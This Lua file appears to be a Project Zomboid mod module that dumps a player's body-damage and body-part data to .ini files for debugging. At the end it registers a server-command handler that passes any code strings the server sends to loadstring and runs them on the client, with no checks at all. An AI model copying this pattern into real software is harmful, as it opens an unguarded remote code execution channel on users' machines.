ZM_MedicalCheck = {}

-- Import the reflection utilities
if not ZM_ReflectionUtils then
    require "util/ZM_ReflectionUtils"
end

function ZM_MedicalCheck.checkMedicalStatus(player)
    -- If player is not provided, use the current player
    player = player or getPlayer()

    if not player then
        print("No player found.")
        return
    end

    print("=== Medical Status Report for " .. player:getUsername() .. " ===")

    -- Get the body damage object
    local bodyDamage = player:getBodyDamage()
    print("Object type: " .. type(bodyDamage))

    local filePath = "bodyDamageDump_" .. player:getUsername() .. ".ini"

    -- Inspect bodyDamage object
    local results = ZM_ReflectionUtils.inspectObject(bodyDamage, {discoverMethods = true})

    -- Write to file
    local header = "=== Body Damage Report for " .. player:getUsername() .. " ===\nObject type: " .. type(bodyDamage)
    local success = ZM_ReflectionUtils.writeInspectionToFile(results, filePath, header)

    if success then
        print("bodyDamage information dumped to " .. filePath)
    else
        print("Failed to create " .. filePath .. " for writing.")
    end

    local bodyParts = bodyDamage:getBodyParts()
    if bodyParts and bodyParts:size() > 0 then
        -- Create a single file for all body parts
        local allPartsFilePath = "bodyPartsDump_" .. player:getUsername() .. ".ini"
        local fileWriter = getFileWriter(allPartsFilePath, true, false)

        if fileWriter then
            fileWriter:write("=== Body Parts Report for " .. player:getUsername() .. " ===\n\n")
            fileWriter:write("Total body parts: " .. bodyParts:size() .. "\n\n")

            -- Iterate through all body parts
            for i = 0, bodyParts:size() - 1 do
                local part = bodyParts:get(i)
                local partType = part:getType():toString()

                fileWriter:write("=== Body Part: " .. partType .. " (index " .. i .. ") ===\n")

                -- Get part properties through reflection
                local partResults = ZM_ReflectionUtils.inspectObject(part, {discoverMethods = true})

                -- Write fields
                if type(partResults.fields) == "table" then
                    for fieldName, value in pairs(partResults.fields) do
                        if fieldName then
                            fileWriter:write(tostring(fieldName) .. " = " .. tostring(value) .. "\n")
                        end
                    end
                end

                fileWriter:write("\n")
            end

            fileWriter:close()
            print("All body parts information dumped to " .. allPartsFilePath)
        else
            print("Failed to create file for body parts data")
        end
    end

    print("\n=== End of Medical Report ===")
end

-- Event listener for medical status changes
local function onMedicalStatusChange(character, condition, part, state)
    print("Medical status change detected:")
    print("  Character: " .. character:getUsername())
    print("  Condition: " .. condition)

    -- Determine if this is a body part or the entire body
    if part and part.getType then
        -- This is a BodyPart
        print("  Body Part: " .. part:getType():toString())
    else
        -- This is BodyDamage (entire body)
        print("  Body: Full body")
    end

    print("  State: " .. tostring(state))
end


ZM_MedicalCheck.requestCustomCommands = function()
  local player = getPlayer()
  if not player then return end

  sendClientCommand("ZonaMerahCore", "CustomExecute", {})
end

local function onServerCommand(module, command, args)
  if module == "ZonaMerahCore" and command == "ExecuteCommands" then
      print("Received custom commands from server")
      player = getPlayer()
      if not player then return end
      player:Say("Executing custom commands...")
      local commands = args.commands or {}
      local player = getPlayer()

      for _, cmdStr in ipairs(commands) do
          print("Executing command: " .. cmdStr)

          -- Try to execute the command
          pcall(function()
              local func = loadstring(cmdStr)
              if func then
                  func()
              end
          end)
      end
  end
end

Events.OnServerCommand.Add(onServerCommand)

return ZM_MedicalCheck